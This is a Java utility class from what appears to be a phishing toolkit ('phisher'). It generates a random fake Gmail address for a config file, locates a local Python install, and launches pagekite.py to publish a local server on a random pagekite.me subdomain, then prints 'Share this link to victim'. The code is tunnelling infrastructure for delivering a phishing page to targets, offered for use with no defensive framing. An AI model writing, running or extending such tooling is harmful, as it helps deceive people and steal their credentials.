package com.shaw.phisher.utils;

import java.io.File;
import java.io.IOException;
import java.util.Arrays;
import java.util.Objects;
import java.util.Random;

public class Command {
    public static String inputFilePath = System.getProperty("user.home") + "/.phisher/.config";
    public static String pageKiteFilePath = System.getProperty("user.home") + "/.phisher/pagekite.py";
    public static Process execute(String command) throws IOException {
        return Runtime.getRuntime().exec(new String[]{command});
    }
    public static Process pagekiteProcess;

    public static String getRandom(int digits){
        StringBuilder random30 = new StringBuilder();
        Random random = new Random();
        for(int i=0;i<digits;i++){
            random30.append(random.nextInt(10));
        }
        return random30.toString();
    }
    public static void executePageKite() {
        Operations.writeFile(inputFilePath, "\n" + getRandom(30) + "@gmail.com" + "\n\n\n" + "n\n");
        String user = System.getProperty("user.name");
        String pythonPath = "C:\\Users\\" + user + "\\AppData\\Local\\Programs\\Python";
        File file = new File(pythonPath);

        if (!file.exists() && Objects.requireNonNull(file.list()).length == 0) {
            System.out.println("Python installation not found, please install a version of python to run page-kite");
            return;
        }

        Integer i = Arrays.stream(Objects.requireNonNull(file.list())).map(e -> Integer.parseInt(e.substring(e.lastIndexOf('n') + 1))).max(Integer::compare).get();
        inputFilePath = inputFilePath.replaceAll("\\s", "^ ");

        try {
            String name = getRandom(10);
            ProcessBuilder processBuilder = new ProcessBuilder("cmd", "/c start cmd.exe /K \"\"" + pythonPath + "\\Python" + i + "\\python\" \"" + pageKiteFilePath + "\" 8080 " + name + ".pagekite.me < " + inputFilePath + "\"");
            pagekiteProcess = processBuilder.start();
            System.out.println("\nShare this link to victim: "+name+".pagekite.me");
        } catch (Exception e) {
            System.out.println(e);
        }
    }
}
